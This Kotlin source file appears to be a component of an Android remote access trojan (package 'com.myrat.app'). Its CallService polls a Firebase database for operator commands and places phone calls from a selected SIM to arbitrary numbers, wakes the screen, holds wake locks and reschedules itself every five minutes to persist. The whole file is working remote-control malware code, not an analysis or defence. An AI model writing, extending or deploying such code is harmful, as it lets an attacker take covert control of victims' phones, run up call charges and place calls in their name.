package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.*
import android.telecom.PhoneAccountHandle
import android.telecom.TelecomManager
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger
import com.myrat.app.worker.CallServiceRestartWorker
import java.util.concurrent.TimeUnit

class CallService : Service() {
    companion object {
        private const val CHANNEL_ID = "CallServiceChannel"
        private const val NOTIFICATION_ID = 8
        private const val COMMAND_TIMEOUT_MS = 30000L // 30 seconds
        private const val MAX_RETRY_ATTEMPTS = 3
        private const val CALL_DELAY_MS = 2000L // 2 seconds between calls
    }

    private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
    private lateinit var deviceId: String
    private var wakeLock: PowerManager.WakeLock? = null
    private var commandListener: ValueEventListener? = null
    private var isServiceDestroyed = false
    private val commandHandler = Handler(Looper.getMainLooper())
    private val activeCommands = mutableMapOf<String, Runnable>()
    private val processingCommands = mutableSetOf<String>()
    private var lastCallTime = 0L

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        try {
            Logger.log("📞 CallService onCreate started")
            
            // Initialize device ID with fallback
            deviceId = try {
                MainActivity.getDeviceId(this)
            } catch (e: Exception) {
                Logger.error("Failed to get deviceId, using fallback", e)
                generateFallbackDeviceId()
            }
            
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, stopping CallService")
                stopSelf()
                return
            }
            
            // Acquire wake lock
            acquireWakeLock()
            
            // Create notification and start foreground
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(NOTIFICATION_ID, notification)
            
            // Schedule restart mechanism
            scheduleRestart(this)
            
            Logger.log("✅ CallService created successfully for device: $deviceId")
            
        } catch (e: Exception) {
            Logger.error("❌ Failed to initialize CallService", e)
            // Don't stop service immediately, try to continue
        }
    }

    private fun generateFallbackDeviceId(): String {
        return try {
            val androidId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                androidId
            } else {
                "callservice_${System.currentTimeMillis()}_${(1000..9999).random()}"
            }
        } catch (e: Exception) {
            "callservice_emergency_${System.currentTimeMillis()}"
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "CallService:KeepAlive"
                )
                wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
                Logger.log("✅ Wake lock acquired for CallService")
            }
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock for calls", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            Logger.log("📞 CallService onStartCommand")
            
            if (isServiceDestroyed) {
                Logger.error("Service is destroyed, cannot start command")
                return START_NOT_STICKY
            }
            
            if (deviceId.isEmpty()) {
                Logger.error("Device ID is empty, stopping CallService")
                stopSelf()
                return START_NOT_STICKY
            }
            
            // Refresh wake lock
            refreshWakeLock()
            
            // Start listening for commands
            listenForCallCommands(deviceId)
            
            return START_STICKY
        } catch (e: Exception) {
            Logger.error("❌ Failed to start CallService", e)
            return START_STICKY // Still return STICKY to allow restart
        }
    }

    private fun refreshWakeLock() {
        try {
            wakeLock?.let {
                if (it.isHeld) {
                    it.release()
                }
            }
            acquireWakeLock()
        } catch (e: Exception) {
            Logger.error("Error refreshing wake lock", e)
        }
    }

    private fun scheduleRestart(context: Context) {
        try {
            val workRequest = PeriodicWorkRequestBuilder<CallServiceRestartWorker>(
                repeatInterval = 5, TimeUnit.MINUTES,
                flexTimeInterval = 1, TimeUnit.MINUTES
            ).setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
                    .setRequiresBatteryNotLow(false)
                    .setRequiresCharging(false)
                    .setRequiresDeviceIdle(false)
                    .setRequiresStorageNotLow(false)
                    .build()
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                "CallServiceRestart",
                ExistingPeriodicWorkPolicy.KEEP,
                workRequest
            )
            Logger.log("✅ Scheduled CallService restart using WorkManager")
        } catch (e: Exception) {
            Logger.error("Failed to schedule CallService restart", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Call Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Running phone call service with SIM selection"
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(NotificationManager::class.java)
                notificationManager?.createNotificationChannel(channel)
            } catch (e: Exception) {
                Logger.error("Failed to create call notification channel", e)
            }
        }
    }

    private fun buildForegroundNotification(): Notification {
        return try {
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Monitoring call commands with SIM selection")
                .setSmallIcon(android.R.drawable.ic_menu_call)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build call notification", e)
            NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Call Service")
                .setContentText("Running in background")
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun listenForCallCommands(deviceId: String) {
        if (isServiceDestroyed) {
            Logger.error("Service is destroyed, cannot listen for commands")
            return
        }
        
        try {
            // Remove existing listener if any
            commandListener?.let { listener ->
                try {
                    Firebase.database.getReference("Device").child(deviceId).child("call_commands")
                        .removeEventListener(listener)
                } catch (e: Exception) {
                    Logger.error("Error removing existing command listener", e)
                }
            }
            
            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("call_commands")

            commandListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    if (isServiceDestroyed) {
                        Logger.log("Service destroyed, ignoring command data change")
                        return
                    }
                    
                    try {
                        Logger.log("📨 Received call commands data change")
                        
                        snapshot.children.forEach { commandSnapshot ->
                            processCommandSnapshot(commandSnapshot)
                        }
                    } catch (e: Exception) {
                        Logger.error("❌ Error processing call commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("❌ Call commands database error: ${error.message}", error.toException())
                    
                    // Try to reconnect after delay
                    if (!isServiceDestroyed) {
                        commandHandler.postDelayed({
                            if (!isServiceDestroyed) {
                                Logger.log("🔄 Attempting to reconnect call command listener")
                                listenForCallCommands(deviceId)
                            }
                        }, 5000)
                    }
                }
            }
            
            commandsRef.addValueEventListener(commandListener!!)
            Logger.log("✅ Call command listener established")
            
        } catch (e: Exception) {
            Logger.error("❌ Failed to listen for call commands", e)
            
            // Retry after delay
            if (!isServiceDestroyed) {
                commandHandler.postDelayed({
                    if (!isServiceDestroyed) {
                        listenForCallCommands(deviceId)
                    }
                }, 10000)
            }
        }
    }

    private fun processCommandSnapshot(commandSnapshot: DataSnapshot) {
        try {
            val command = commandSnapshot.value as? Map<*, *> ?: run {
                Logger.error("Invalid command data for ${commandSnapshot.key}")
                return
            }
            
            val status = command["status"] as? String
            val simNumber = command["sim_number"] as? String
            val recipient = command["recipient"] as? String
            val commandId = commandSnapshot.key ?: return

            if (status != "pending") {
                Logger.log("⏭️ Skipping command $commandId with status $status")
                return
            }
            
            // Check if command is already being processed
            if (processingCommands.contains(commandId)) {
                Logger.log("⏭️ Command $commandId already being processed")
                return
            }
            
            if (simNumber.isNullOrBlank() || recipient.isNullOrBlank()) {
                Logger.error("❌ Invalid call command data for command $commandId: sim_number=$simNumber, recipient=$recipient")
                updateCommandStatus(commandId, "failed", "Invalid sim_number or recipient")
                return
            }
            
            Logger.log("📞 Processing call command: $commandId from $simNumber to $recipient")
            
            // Mark command as being processed
            processingCommands.add(commandId)
            
            // Process command with timeout
            processCommandWithTimeout(commandId, simNumber, recipient)
            
        } catch (e: Exception) {
            Logger.error("❌ Error processing command snapshot", e)
        }
    }

    private fun processCommandWithTimeout(commandId: String, simNumber: String, recipient: String) {
        try {
            // Cancel any existing timeout for this command
            activeCommands[commandId]?.let { commandHandler.removeCallbacks(it) }
            
            // Set timeout for command processing
            val timeoutRunnable = Runnable {
                Logger.error("⏰ Call command timeout: $commandId")
                updateCommandStatus(commandId, "timeout", "Command processing timed out")
                activeCommands.remove(commandId)
                processingCommands.remove(commandId)
            }
            
            activeCommands[commandId] = timeoutRunnable
            commandHandler.postDelayed(timeoutRunnable, COMMAND_TIMEOUT_MS)
            
            // Process the command
            val success = initiateCallWithSingleMethod(simNumber, recipient, commandId)
            
            // Cancel timeout if command completed
            activeCommands[commandId]?.let { 
                commandHandler.removeCallbacks(it)
                activeCommands.remove(commandId)
            }
            
            processingCommands.remove(commandId)
            
            if (!success) {
                updateCommandStatus(commandId, "failed", "Call initiation failed")
            }
            
        } catch (e: Exception) {
            Logger.error("❌ Error in processCommandWithTimeout", e)
            updateCommandStatus(commandId, "error", "Processing error: ${e.message}")
            activeCommands.remove(commandId)
            processingCommands.remove(commandId)
        }
    }

    private fun initiateCallWithSingleMethod(simNumber: String, recipient: String, commandId: String): Boolean {
        try {
            val alreadySentSet = sentCallTracker.getOrPut(commandId) { mutableSetOf() }
            if (alreadySentSet.contains(recipient)) {
                Logger.log("⏭️ Skipping duplicate call to $recipient for command $commandId")
                return false
            }

            // Rate limiting - prevent too many calls too quickly
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastCallTime < CALL_DELAY_MS) {
                Logger.log("⏸️ Rate limiting: waiting before next call")
                Thread.sleep(CALL_DELAY_MS - (currentTime - lastCallTime))
            }
            lastCallTime = System.currentTimeMillis()

            // Check permissions
            val hasCallPhonePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.CALL_PHONE
            ) == PackageManager.PERMISSION_GRANTED
            val hasReadPhoneStatePermission = ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED

            Logger.log("📋 Permission check: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")

            if (!hasCallPhonePermission || !hasReadPhoneStatePermission) {
                Logger.error("❌ Missing permissions: CALL_PHONE=$hasCallPhonePermission, READ_PHONE_STATE=$hasReadPhoneStatePermission")
                updateCommandStatus(commandId, "failed", "Missing required permissions")
                return false
            }

            // Get SIM information
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (subscriptionManager == null) {
                Logger.error("❌ SubscriptionManager is null")
                updateCommandStatus(commandId, "failed", "SubscriptionManager unavailable")
                return false
            }
            
            val subscriptionInfoList = try {
                subscriptionManager.activeSubscriptionInfoList
            } catch (e: SecurityException) {
                Logger.error("❌ SecurityException getting subscription list", e)
                updateCommandStatus(commandId, "failed", "Permission denied for subscription access")
                return false
            } catch (e: Exception) {
                Logger.error("❌ Error getting subscription list", e)
                updateCommandStatus(commandId, "failed", "Error accessing SIM information")
                return false
            }
            
            if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
                Logger.error("❌ No active SIM subscriptions found")
                updateCommandStatus(commandId, "failed", "No active SIM subscriptions")
                return false
            }

            Logger.log("📱 Available SIMs: ${subscriptionInfoList.map { "sim${it.simSlotIndex + 1}:${it.number}:${it.displayName}" }}")

            // Find matching SIM
            val subscriptionInfo = subscriptionInfoList.find { info ->
                try {
                    info.number == simNumber ||
                    "sim${info.simSlotIndex + 1}" == simNumber.lowercase() ||
                    info.displayName.toString().lowercase().contains(simNumber.lowercase()) ||
                    info.carrierName.toString().lowercase().contains(simNumber.lowercase()) ||
                    simNumber.lowercase() == "sim1" && info.simSlotIndex == 0 ||
                    simNumber.lowercase() == "sim2" && info.simSlotIndex == 1
                } catch (e: Exception) {
                    Logger.error("Error checking SIM info: ${e.message}")
                    false
                }
            }

            if (subscriptionInfo == null) {
                Logger.error("❌ No SIM found for simNumber: $simNumber")
                updateCommandStatus(commandId, "failed", "No SIM found for: $simNumber")
                return false
            }

            val subId = subscriptionInfo.subscriptionId
            val simSlotIndex = subscriptionInfo.simSlotIndex
            Logger.log("✅ Mapped $simNumber to subscriptionId: $subId (slot: $simSlotIndex)")

            // Use SINGLE method - TelecomManager with fallback to Intent
            val success = makeCallWithSingleReliableMethod(recipient, subId, simSlotIndex, commandId)
            
            if (success) {
                alreadySentSet.add(recipient)
                updateCommandStatus(commandId, "success", null)
                Logger.log("✅ Successfully initiated call from $simNumber (subId: $subId) to $recipient")
            } else {
                updateCommandStatus(commandId, "failed", "Call initiation failed")
                Logger.error("❌ Failed to initiate call from $simNumber to $recipient")
            }
            
            return success

        } catch (e: SecurityException) {
            Logger.error("❌ Permission denied for call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Permission denied: ${e.message}")
            return false
        } catch (e: Exception) {
            Logger.error("❌ Failed to initiate call to $recipient: ${e.message}", e)
            updateCommandStatus(commandId, "failed", "Unexpected error: ${e.message}")
            return false
        }
    }

    private fun makeCallWithSingleReliableMethod(recipient: String, subId: Int, simSlotIndex: Int, commandId: String): Boolean {
        try {
            Logger.log("📞 Making call to $recipient using single reliable method")
            
            // Wake up screen first
            wakeUpScreen()
            
            // Method 1: Try TelecomManager (Android 6+) - MOST RELIABLE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    val telecomManager = getSystemService(TELECOM_SERVICE) as? TelecomManager
                    if (telecomManager != null) {
                        val phoneAccountHandle = getPhoneAccountHandleForSubscription(telecomManager, subId)
                        
                        if (phoneAccountHandle != null) {
                            val uri = Uri.parse("tel:$recipient")
                            val extras = Bundle().apply {
                                putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, phoneAccountHandle)
                                putInt("android.telephony.extra.SUBSCRIPTION_ID", subId)
                                putInt("com.android.phone.extra.slot", simSlotIndex)
                                putInt("subscription", subId)
                                putBoolean(TelecomManager.EXTRA_START_CALL_WITH_SPEAKERPHONE, false)
                            }
                            
                            telecomManager.placeCall(uri, extras)
                            Logger.log("✅ Call placed successfully using TelecomManager")
                            return true
                        } else {
                            Logger.warn("⚠️ PhoneAccountHandle not found for subId: $subId, trying fallback")
                        }
                    } else {
                        Logger.warn("⚠️ TelecomManager is null, trying fallback")
                    }
                } catch (e: SecurityException) {
                    Logger.error("❌ SecurityException in TelecomManager, trying fallback", e)
                } catch (e: Exception) {
                    Logger.error("❌ TelecomManager failed, trying fallback", e)
                }
            }
            
            // Method 2: Fallback to Intent.ACTION_CALL (ONLY if TelecomManager failed)
            try {
                Logger.log("📞 Using fallback Intent.ACTION_CALL method")
                
                val callIntent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$recipient")
                    putExtra("com.android.phone.force.slot", true)
                    putExtra("com.android.phone.extra.slot", simSlotIndex)
                    putExtra("android.telephony.extra.SUBSCRIPTION_ID", subId)
                    putExtra("subscription", subId)
                    putExtra("simSlot", simSlotIndex)
                    // Additional manufacturer-specific extras
                    putExtra("com.android.phone.DialerActivity.extra.slot", simSlotIndex)
                    putExtra("Cdma_Supp", false)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                
                startActivity(callIntent)
                Logger.log("✅ Call placed successfully using Intent.ACTION_CALL")
                return true
                
            } catch (e: SecurityException) {
                Logger.error("❌ SecurityException in Intent.ACTION_CALL", e)
            } catch (e: Exception) {
                Logger.error("❌ Intent.ACTION_CALL failed", e)
            }
            
            Logger.error("❌ All call methods failed for $recipient")
            return false

        } catch (e: Exception) {
            Logger.error("❌ Unexpected error in makeCallWithSingleReliableMethod: ${e.message}", e)
            return false
        }
    }

    private fun getPhoneAccountHandleForSubscription(telecomManager: TelecomManager, subId: Int): PhoneAccountHandle? {
        return try {
            val phoneAccounts = telecomManager.callCapablePhoneAccounts
            Logger.log("📱 Available phone accounts: ${phoneAccounts.size}")

            // Get SubscriptionManager to verify subscription exists
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            val activeSubscriptions = subscriptionManager?.activeSubscriptionInfoList
            Logger.log("📱 Active subscriptions: ${activeSubscriptions?.size ?: 0}")

            phoneAccounts.find { account ->
                try {
                    val phoneAccount = telecomManager.getPhoneAccount(account)
                    val accountSubId = phoneAccount?.extras?.getInt("android.telephony.extra.SUBSCRIPTION_ID", -1) ?: -1
                    
                    // Verify the subscriptionId exists in active subscriptions
                    val isValidSubscription = activeSubscriptions?.any { it.subscriptionId == accountSubId } ?: false
                    Logger.log("🔍 Comparing accountSubId: $accountSubId with target subId: $subId, isValid: $isValidSubscription")
                    
                    accountSubId == subId && isValidSubscription
                } catch (e: Exception) {
                    Logger.error("Error checking phone account: $account", e)
                    false
                }
            }
        } catch (e: SecurityException) {
            Logger.error("SecurityException while getting PhoneAccountHandle", e)
            null
        } catch (e: Exception) {
            Logger.error("Failed to get PhoneAccountHandle for subId: $subId", e)
            null
        }
    }

    private fun wakeUpScreen() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (powerManager != null && !powerManager.isInteractive) {
                val screenWakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "CallService:ScreenWake"
                )
                screenWakeLock.acquire(10000) // 10 seconds
                screenWakeLock.release()
                Logger.log("💡 Screen woken up for call")
            }
        } catch (e: Exception) {
            Logger.error("Failed to wake up screen for call", e)
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            if (isServiceDestroyed) {
                Logger.log("Service destroyed, skipping command status update")
                return
            }
            
            val commandRef = Firebase.database.getReference("Device/$deviceId/call_commands/$commandId")
            val updates = mutableMapOf<String, Any?>(
                "status" to status,
                "timestamp" to System.currentTimeMillis(),
                "processedBy" to "CallService"
            )
            if (error != null) {
                updates["error"] = error
            }
            
            commandRef.updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("✅ Updated call command $commandId to status $status")
                    if (status == "success" || status == "failed" || status == "timeout") {
                        // Remove command after completion
                        commandRef.removeValue()
                            .addOnSuccessListener {
                                Logger.log("🗑️ Removed call command $commandId")
                                sentCallTracker.remove(commandId)
                            }
                            .addOnFailureListener { e ->
                                Logger.error("Failed to remove command: ${e.message}", e)
                            }
                    }
                }
                .addOnFailureListener { e ->
                    Logger.error("❌ Failed to update call command $commandId: ${e.message}", e)
                }
        } catch (e: Exception) {
            Logger.error("❌ Error updating call command status", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            Logger.log("🔄 CallService onDestroy started")
            isServiceDestroyed = true
            
            // Cancel all active command timeouts
            activeCommands.values.forEach { runnable ->
                commandHandler.removeCallbacks(runnable)
            }
            activeCommands.clear()
            processingCommands.clear()
            
            // Remove Firebase listener
            commandListener?.let { listener ->
                try {
                    Firebase.database.getReference("Device").child(deviceId).child("call_commands")
                        .removeEventListener(listener)
                    Logger.log("✅ Removed Firebase command listener")
                } catch (e: Exception) {
                    Logger.error("Error removing Firebase listener", e)
                }
            }
            
            // Release wake lock
            wakeLock?.let {
                try {
                    if (it.isHeld) {
                        it.release()
                        Logger.log("✅ Released wake lock")
                    }
                } catch (e: Exception) {
                    Logger.error("Error releasing wake lock", e)
                }
            }
            
            // Clear tracking data
            sentCallTracker.clear()
            
            Logger.log("✅ CallService destroyed successfully")
        } catch (e: Exception) {
            Logger.error("❌ Error destroying CallService", e)
        }
    }
}